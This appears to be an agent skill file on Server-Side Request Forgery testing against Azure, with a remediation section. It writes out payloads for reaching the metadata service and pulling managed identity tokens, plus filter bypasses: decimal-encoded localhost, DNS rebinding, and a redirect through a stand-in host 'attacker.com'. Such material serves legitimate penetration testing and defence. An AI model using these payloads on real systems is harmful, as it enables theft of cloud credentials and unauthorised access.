---
name: offensive-ssrf
description: "Server-Side Request Forgery (SSRF) testing skill with focus on Azure metadata services and internal network pivots. Covers discovery, bypass techniques, and Azure-specific exploitation (IMDS, Managed Identities)."
domain: cybersecurity
subdomain: web-security
tags:
- ssrf
- azure
- imds
- metadata-service
- web-security
version: '1.0'
author: openshield
license: Apache-2.0
nist_csf:
- PR.AC-3
- PR.AC-5
- SC-7
- PR.DS-1
- DE.CM-1
---

# Server-Side Request Forgery (SSRF) — Azure Offensive Methodology

## When to Use
- When testing web applications that fetch external URLs or process user-provided links.
- When assessing cloud metadata exposure on Azure Virtual Machines or App Services.
- When performing internal port scanning or service discovery from a compromised web entry point.
- When validating WAF and network security group (NSG) effectiveness against egress request forgery.

## Key Concepts

| Term | Definition |
|------|------------|
| IMDS | Instance Metadata Service, reachable at `169.254.169.254` in Azure |
| Blind SSRF | A vulnerability where the server makes a request but does not return the content to the attacker |
| DNS Rebinding | A technique to bypass IP filters by changing the DNS resolution of a domain mid-attack |
| Out-of-Band (OOB) | Using an external server (e.g., Burp Collaborator) to detect triggered requests |

## Detection & Exploitation

### Azure Metadata Service (IMDS)
Azure's IMDS requires a specific header `Metadata: true` and an `api-version` to prevent simple SSRF.

```bash
# Accessing Azure Instance Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header required: Metadata: true

# Accessing Managed Identity Tokens
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Bypass Techniques
- **IP Encoding**: `http://2130706433/` (Decimal for 127.0.0.1)
- **DNS Rebinding**: Using services like `rbndr.us`
- **Redirect Chains**: `http://attacker.com/redirect?url=http://127.0.0.1:8080`

## Remediation Reference
- **Allowlisting**: Only allow requests to specific, trusted domains.
- **Egress Filtering**: Use Azure Firewall or NSGs to restrict outbound traffic from web servers.
- **Metadata Protection**: Ensure web applications do not have permissions to add or modify custom headers like `Metadata: true`.
